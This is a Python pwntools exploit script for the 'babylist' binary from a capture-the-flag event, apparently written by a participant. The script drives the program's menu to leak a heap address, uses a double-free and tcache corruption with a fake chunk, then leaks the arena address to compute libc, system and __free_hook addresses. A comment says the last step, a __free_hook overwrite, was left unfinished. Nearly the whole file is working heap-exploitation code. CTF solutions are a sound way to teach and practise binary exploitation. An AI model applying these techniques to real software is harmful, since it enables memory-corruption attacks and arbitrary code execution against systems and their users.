from pwn import *
import signal
import sys
import time

def signal_handler(sig, frame):
        print('You pressed Ctrl+C!')
        sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
prog_name = './babylist'
#context.log_level = logging.DEBUG #with debug output
context.binary = prog_name
debug = int(sys.argv[1])
online=False
if( debug == 0):
  r = remote("challenges.fbctf.com", 1343)
  libcz = ELF("./libc-2.27.so")
  online=True
elif(debug == 1):
  r = process(prog_name, aslr=False)
  #libcz = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def halt():
  while True:
    log.info( r.recvline() )

def create_list(name_list):
  r.recvuntil(">")
  r.sendline('1')
  r.recvuntil("for list:")
  r.sendline(name_list)

def add_elem(index, index2):
  r.recvuntil(">")
  r.sendline('2')
  r.recvuntil("of list:")
  r.sendline(str(index))
  r.recvuntil("to add:")
  r.sendline(str(index2))

def view_elem(index, index2):
  r.recvuntil(">")
  r.sendline('3')
  r.recvuntil("of list:")
  r.sendline(str(index))
  r.recvuntil("into list:")
  r.sendline(str(index2))

def dupl_elem(index, name):
  r.recvuntil(">")
  r.sendline('4')
  r.recvuntil("of list:")
  r.sendline(str(index))
  r.recvuntil("new list:")
  r.sendline(name)

def del_elem(index):
  r.recvuntil(">")
  r.sendline('5')
  r.recvuntil("of list:")
  r.sendline(str(index))

def give_up():
  r.recvuntil(">")
  r.sendline('6')

def interactive():
  if not online:
    print( """/usr/bin/gdb -q  {0} {1}""".format( r.argv[0], r.pid ) )
  r.interactive()

def exploit():
  #Part 1- leak of the heap
  create_list("0Pino") #0
  add_elem(0, 0)
  add_elem(0, 1)
  dupl_elem(0, "1Pino") #1
  add_elem(0, 2)
  add_elem(0, 3)
  dupl_elem(0, "2Pino") #2
  
  for x in range(4, 0x10, 1):
    add_elem(0, x)

  view_elem(2,0)
  r.recvuntil("= ")
  tmp1 = int( r.recvline().rstrip() )
  view_elem(2,1)
  r.recvuntil("= ")
  leak_heap = (int( r.recvline().rstrip() )<<32) + tmp1
  heap_baseaddr = leak_heap - 0x11f20
  heap_limit = heap_baseaddr + 0x21000
  fake_chunk = heap_baseaddr + 0x11ee8
  baseaddr_chunk = heap_baseaddr + 0x12090
  special_chunk = heap_baseaddr + 0x123d0
  log.info("Heap leak :0x{0:x}".format(leak_heap))
  log.info("Heap base addr :0x{0:x}".format(heap_baseaddr))

  #Part 2: 
  #   - Double-free
  #   - Corrupt t-cache with Partial overwrite 
  #   - give back the memory pointed by the object_lista[0], in particular write in object[0][0x70 + 0x10] the heap_limit
  if not online:
    gdb.attach(r, '''
    set follow-fork-mode child
    #b *(0x555555554000 + 0x220F)
    #b *(0x555555554000 + 0x2265)
    #b *(0x555555554000 + 0x2086)
    continue
    #x/50gx 0x55555576ae70
    ''')
  dupl_elem(1, "3Pino") #3
  create_list("4Pino") #4
  add_elem(4, 0x1337)
  add_elem(3, 0x1337)
  add_elem(4, 0x1337)
  add_elem(3, 0x1337)
  add_elem(3, 0x1337)
  add_elem(2, 0x1337)
  create_list("5Pino") #5
  add_elem(4, (fake_chunk & 2**32-1))
  add_elem(4, ((fake_chunk >> 32) & 2**32-1))
  create_list("6Pino") #6
  add_elem(5, (fake_chunk & 2**32-1))
  create_list("7Pino") #7
  add_elem(6, (heap_limit & 2**32-1))
  add_elem(6, ((heap_limit >> 32)& 2**32-1))
  log.info("##Done Part 2")
  
  #Part 3- Now leak arena and libc
  for x in range(8,10,1): #9
    create_list("{0}".format(x))
  for x in range(1,9,1):
    del_elem(x)

  calc_offset = ((special_chunk - baseaddr_chunk) / 4) + 6
  view_elem(0, calc_offset)
  r.recvuntil("= ")
  tmp1 = int( r.recvline() )
  view_elem(0, calc_offset + 1)
  r.recvuntil("= ")
  leak_arena = ((int( r.recvline().rstrip() )<<32) + tmp1) - 0x60
  libc_baseaddr = leak_arena - 0x3ebc40
  system = libc_baseaddr + 0x000000000004f440
  free_hook = libc_baseaddr + 0x00000000003ed8e8
  log.info("arena leak :0x{0:x}".format(leak_arena))
  log.info("Libc base addr :0x{0:x}".format(libc_baseaddr))
  log.info("system addr :0x{0:x}".format(system))
  log.info("free hook addr :0x{0:x}".format(free_hook))
  log.info("##Done Part 3")
  
  #Part 4  At this time the event has passed, so i didn't continue but this should be a good path to continue on
  #   - Double-free
  #   - Corrupt t-cache to give back __free_hook 
  interactive()
  return
  
  
print('Press Ctrl+C')
exploit()
